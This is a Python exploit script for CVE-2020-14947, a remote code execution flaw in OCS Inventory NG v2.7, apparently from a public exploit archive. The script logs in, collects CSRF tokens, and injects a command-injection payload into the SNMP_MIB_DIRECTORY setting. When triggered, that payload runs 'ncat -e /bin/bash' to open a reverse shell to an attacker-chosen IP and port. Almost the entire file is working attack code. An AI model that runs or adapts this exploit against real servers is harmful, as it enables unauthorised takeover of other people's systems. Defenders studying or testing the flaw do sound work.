#!/usr/bin/python3

# Exploit Title: OCS Inventory NG v2.7 Remote Code Execution
# Date: 06/05/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-14947
# Vendor Homepage: https://ocsinventory-ng.org/
# Version: v2.7
# Tested on: Ubuntu 18.04 / PHP 7.2.24

import requests
import sys
import warnings
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import quote

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 6:
    print("[~] Usage : ./ocsng-exploit.py url username password ip port")
    exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

request = requests.session()


def login():
    login_info = {
    "Valid_CNX": "Send",
    "LOGIN": username,
    "PASSWD": password
    }
    login_request = request.post(url+"/index.php", login_info)
    login_text = login_request.text
    if "User not registered" in login_text:
        return False
    else:
        return True


def inject_payload():
    csrf_req = request.get(url+"/index.php?function=admin_conf")
    content = csrf_req.text
    soup = BeautifulSoup(content, "lxml")
    first_token = soup.find_all("input", id="CSRF_10")[0].get("value")
    print("[+] 1st token : %s" % first_token)
    first_data = {
    "CSRF_10": first_token,
    "onglet": "SNMP",
    "old_onglet": "INVENTORY"
    }
    req = request.post(url+"/index.php?function=admin_conf", data=first_data)
    content2 = req.text
    soup2 = BeautifulSoup(content2, "lxml")
    second_token = soup2.find_all("input", id="CSRF_14")[0].get("value")
    print("[+] 2nd token : %s" % second_token)
    payload = "; ncat -e /bin/bash %s %s #" % (ip, port)
    #RELOAD_CONF=&Valid=Update
    inject_request = {
    "CSRF_14": second_token,
    "onglet": "SNMP",
    "old_onglet": "SNMP",
    "SNMP": "0",
    "SNMP_INVENTORY_DIFF": "1",
    # The payload should be here
    "SNMP_MIB_DIRECTORY": payload,
    "RELOAD_CONF": "",
    "Valid": "Update"
    }
    final_req = request.post(url+"/index.php?function=admin_conf", data=inject_request)
    if "Update done" in final_req.text:
        print("[+] Payload injected successfully")
        execute_payload()


def execute_payload():
    csrf_req = request.get(url+"/index.php?function=SNMP_config")
    content = csrf_req.text
    soup = BeautifulSoup(content, "lxml")
    third_token = soup.find_all("input", id="CSRF_22")[0].get("value")
    third_request = request.post(url+"/index.php?function=SNMP_config", files={
    'CSRF_22': (None, third_token),
    'onglet': (None, 'SNMP_MIB'),
    'old_onglet': (None, 'SNMP_RULE'),
    'snmp_config_length': (None, '10')
    })
    print("[+] 3rd token : %s" % third_token)
    third_request_text = third_request.text
    soup = BeautifulSoup(third_request_text, "lxml")
    forth_token = soup.find_all("input", id="CSRF_26")[0].get("value")
    print("[+] 4th token : %s" % forth_token)
    print("[+] Triggering payload ..")
    print("[+] Check your nc ;)")
    forth_request = request.post(url+"/index.php?function=SNMP_config", files={
    'CSRF_26': (None, forth_token),
    'onglet': (None, 'SNMP_MIB'),
    'old_onglet': (None, 'SNMP_MIB'),
    'update_snmp': (None, 'send')
    })



if login():
    print("[+] Valid credentials!")
    inject_payload()
